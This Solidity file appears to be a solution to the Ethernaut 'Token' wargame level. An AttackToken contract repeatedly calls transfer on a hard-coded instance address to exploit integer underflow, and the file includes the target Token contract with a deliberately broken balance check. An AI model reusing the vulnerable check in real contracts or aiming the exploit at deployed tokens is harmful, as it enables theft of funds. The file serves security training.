// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/* OVERFLOW */
contract AttackToken {
    Token TokenInstance = Token(0x28945b1300eC8B17A3e4fd90424bF8C35315934E); // ethernaut Instance Contract

    function transferAttacker() external {
        for (uint256 i = 0; i < 20; i++) {
            uint balanceOfA = TokenInstance.balanceOf(msg.sender);
            TokenInstance.transfer(msg.sender, balanceOfA + 1);
        }
    }
}

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
